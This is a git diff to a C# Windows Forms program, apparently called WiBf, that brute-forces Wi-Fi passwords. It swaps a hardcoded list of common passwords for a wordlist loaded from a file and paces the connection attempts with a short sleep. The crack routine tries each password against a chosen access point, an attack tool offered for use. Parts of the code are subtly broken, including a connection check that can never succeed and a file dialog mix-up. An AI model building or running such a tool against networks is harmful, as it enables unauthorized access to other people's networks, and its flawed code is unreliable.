@@ -10,6 +10,8 @@ using System.Threading;
 using System.Windows.Forms;
 using SimpleWifi;
 using SimpleWifi.Win32;
+using NativeWifi;
+using System.Collections.ObjectModel;
 
 namespace WiBf
 {
@@ -28,33 +30,33 @@ namespace WiBf
 			wifi = new Wifi();
 			wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
 			linkLabel1.Links.Add(12, 7, "https://github.com/Tlgyt");
-			passwords.Add("password");
-			passwords.Add("123456");
-			passwords.Add("12345678");
-			passwords.Add("abc123");
-			passwords.Add("querty");
-			passwords.Add("monkey");
-			passwords.Add("letmein");
-			passwords.Add("dragon");
-			passwords.Add("111111");
-			passwords.Add("baseball");
-			passwords.Add("iloveyou");
-			passwords.Add("trustno1");
-			passwords.Add("1234567");
-			passwords.Add("sunshine");
-			passwords.Add("master");
-			passwords.Add("123123");
-			passwords.Add("welcome");
-			passwords.Add("shadow");
-			passwords.Add("ashley");
-			passwords.Add("footbal");
-			passwords.Add("jesus");
-			passwords.Add("michael");
-			passwords.Add("ninja");
-			passwords.Add("mustang");
-			passwords.Add("password1");
-			passwords.Add("honey987");
 			List();
+		}
+
+		private int check(AccessPoint selectedAP)
+		{
+			NativeWifi.WlanClient wlan = new NativeWifi.WlanClient();
+			Collection<String> connectedSsids = new Collection<string>();
+			if (WifiStatus.Connected.ToString() == "true")
+			{
+				foreach (NativeWifi.WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
+				{
+					Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
+					connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
+				}
+				foreach (string ssid in connectedSsids)
+				{
+					if (selectedAP.Name == ssid)
+					{
+						return 1;
+					}
+					else
+					{
+						return 0;
+					}
+				}
+			}
+			return 0;
 		}
 
 		private IEnumerable<AccessPoint> List()
@@ -78,24 +80,18 @@ namespace WiBf
 			Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
 		}
 
-		private static void OnConnectedComplete(bool success)
+		private void OnConnectedComplete(bool success)
 		{
 			Console.WriteLine("\nOnConnectedComplete, success: {0}", success);
 		}
 
-		private static bool Connected()
-		{
-			//Console.WriteLine("\r\n-- CONNECTION STATUS --");
-			if (wifi.ConnectionStatus == WifiStatus.Connected)
-				//Console.WriteLine("You are connected to a wifi");
-				return true;
-			else
-				//Console.WriteLine("You are not connected to a wifi");
-				return false;
-		}
-
 		private void crack(AccessPoint selectedAP)
 		{
+			if (passwords.Count == 0)
+			{
+				MessageBox.Show("Please Select a Wordlist");
+				return;
+			}
 			foreach (string pass in passwords)
 			{
 				// Auth
@@ -123,6 +119,7 @@ namespace WiBf
 				}
 
 				selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
+				Thread.Sleep(100);
 			}
 		}
 
@@ -141,17 +138,39 @@ namespace WiBf
 					}
 				}
 				crack(selectedAP);
-				//Thread t = new Thread(() => crack(selectedAP));t.Start();
 			}
-			catch (Exception)
+			catch (Exception a)
 			{
-				MessageBox.Show("Please select a network from the list");
+				MessageBox.Show(a.ToString());
 			}
 		}
 
 		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
 		{
 			System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
+		}
+
+		private void button2_Click(object sender, EventArgs e)
+		{
+			OpenFileDialog oFile = new OpenFileDialog();
+			openFileDialog1.InitialDirectory = "c:\\";
+			openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
+			openFileDialog1.FilterIndex = 2;
+			openFileDialog1.RestoreDirectory = true;
+			string path;
+			if (oFile.ShowDialog() == DialogResult.OK)
+			{
+				path = oFile.FileName;
+				int counter = 0;
+				string line;
+				System.IO.StreamReader file = new System.IO.StreamReader(path);
+				while ((line = file.ReadLine()) != null)
+				{
+					passwords.Add(line);
+					counter++;
+				}
+				file.Close();
+			}
 		}
 	}
 }
